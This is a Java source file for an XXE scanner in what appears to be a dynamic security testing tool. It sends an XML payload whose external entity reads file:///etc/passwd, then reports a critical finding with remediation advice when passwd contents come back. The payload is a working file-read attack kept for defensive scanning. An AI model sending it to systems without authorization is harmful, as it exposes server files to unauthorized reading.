package ch.hug.orthrusdast.scanner;

import ch.hug.orthrusdast.http.ScanHttpClient;
import ch.hug.orthrusdast.model.CWEReference;
import ch.hug.orthrusdast.model.Operation;
import ch.hug.orthrusdast.model.RiskLevel;
import ch.hug.orthrusdast.model.Vulnerability;
import org.springframework.stereotype.Component;
import reactor.core.publisher.Flux;

import java.util.List;

/**
 * Scans for XML External Entity (XXE) vulnerabilities.
 */
@Component
public class XxeScanner implements SecurityScanner {

    private final ScanHttpClient httpClient;
    
    // Malicious DTD that attempts to read the /etc/passwd file (classic XXE)
    private static final String XXE_PAYLOAD = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>" +
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>" +
            "<foo>&xxe;</foo>";

    public XxeScanner(ScanHttpClient httpClient) {
        this.httpClient = httpClient;
    }

    @Override
    public String getId() {
        return "xxe-injection";
    }

    @Override
    public String getName() {
        return "XML External Entity Scanner";
    }

    @Override
    public Flux<Vulnerability> scan(Operation operation) {
        // Only target POST/PUT/PATCH endpoints that might accept XML
        if (!List.of("POST", "PUT", "PATCH").contains(operation.method().toUpperCase())) {
            return Flux.empty();
        }

        java.util.Map<String, String> newHeaders = new java.util.HashMap<>(operation.headers());
        newHeaders.put("Content-Type", "application/xml");

        Operation testOp = new Operation(
                operation.url(),
                operation.method(),
                newHeaders,
                operation.queryParams(),
                XXE_PAYLOAD,
                operation.securityRequirements(),
                operation.expectedContentTypes(),
                operation.authScheme()
        );

        return httpClient.send(testOp).flatMapMany(response -> {
            // Check if the server returns contents of /etc/passwd
            if (response.bodyContains("root:x:0:0:") || response.bodyContains("daemon:x:1:1:")) {
                Vulnerability vuln = Vulnerability.createWithDetails(
                        "XML External Entity (XXE) Injection",
                        "The endpoint processes untrusted XML and evaluates external entities. This allowed the scanner to read local files on the server.",
                        RiskLevel.CRITICAL,
                        Vulnerability.Confidence.HIGH,
                        getId(),
                        operation,
                        CWEReference.CWE_611,
                        "Injection",
                        List.of("CAPEC-228"),
                        9.8,
                        "The response contained the contents of /etc/passwd.",
                        "Disable external entity parsing in your XML parser configuration. For Java, configure DocumentBuilderFactory to disallow DOCTYPE declarations.",
                        "Injected XML payload with external entity pointing to file:///etc/passwd",
                        "Status: " + response.statusCode() + "\nBody snippet: " + (response.body() != null && response.body().length() > 200 ? response.body().substring(0, 200) + "..." : String.valueOf(response.body()))
                );
                return Flux.just(vuln);
            }
            return Flux.empty();
        });
    }
}
